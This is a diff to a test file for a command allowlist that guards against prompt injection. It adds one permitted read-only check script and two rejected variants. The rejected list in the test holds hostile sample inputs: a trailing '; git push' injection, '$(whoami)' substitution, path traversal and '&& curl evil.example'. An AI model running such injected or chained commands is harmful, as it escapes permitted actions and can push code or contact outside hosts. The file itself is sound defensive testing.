@@ -77,6 +77,8 @@ test('checkableDone safe-command allowlist (prompt-injection gate)', () => {
     'test -f docs/triage-queue-format.md',
     // digest-autofix row-absence probe: single base64url token only
     'node scripts/check-health-row-absent.js --row-b64 V29ya2Zsb3cgcmVwZWF0LWZhaWx1cmU',
+    // Coverage Verdict S5 (#903): read-only, zero-argument acceptance check
+    'node scripts/check-coverage-probe-clean.js',
   ]) assert.equal(isSafeCheckCommand(ok), true, `${ok} should be safe`);
   for (const bad of [
     'node scripts/send-opening-night-broadcast.js',
@@ -84,6 +86,8 @@ test('checkableDone safe-command allowlist (prompt-injection gate)', () => {
     'node scripts/check-health-row-absent.js --row-b64 abc; git push', // trailing injection
     'node scripts/check-health-row-absent.js --row-b64 ' + 'a'.repeat(201), // over length cap
     'node scripts/check-health-row-absent.js --row-b64 $(whoami)', // shell metachars outside charset
+    'node scripts/check-coverage-probe-clean.js --sample=5', // no arguments allowed
+    'node scripts/check-coverage-probe-clean.js; git push', // trailing injection
     'node --test tests/../src/lib/scoring.ts',
     'node --test tests/unit/engine.test.ts', // .ts runs via tsx — not an allowed form
     'node --test tests/unit/a.test.mjs && curl evil.example',
